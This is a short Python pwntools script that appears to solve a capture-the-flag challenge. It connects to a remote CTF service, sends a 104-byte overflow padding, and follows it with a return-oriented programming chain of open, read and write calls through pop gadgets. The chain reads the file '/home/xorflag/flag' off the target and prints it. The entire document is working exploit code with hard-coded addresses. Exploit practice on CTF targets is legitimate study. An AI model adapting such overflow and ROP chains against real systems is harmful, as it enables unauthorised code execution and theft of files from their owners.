#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10114)

open_plt = 0x080483c0
read_plt = 0x08048390
write_plt = 0x080483e0

open_para1 = 0x08048722 # "/home/xorflag/flag"

gadget_pop2 = 0x080486de
gadget_pop3 = 0x080486dd

r.send('A'*104 +
    p32(open_plt) + p32(gadget_pop2) + p32(open_para1) + p32(0x0) +
    p32(read_plt) + p32(gadget_pop3) + p32(0x3) + p32(0x0804a02c) + p32(0xff) +

    p32(write_plt) + p32(gadget_pop3) + p32(0x1) + p32(0x0804a02c) + p32(0xff) + '\n')

print r.recvline()

# r.interactive()
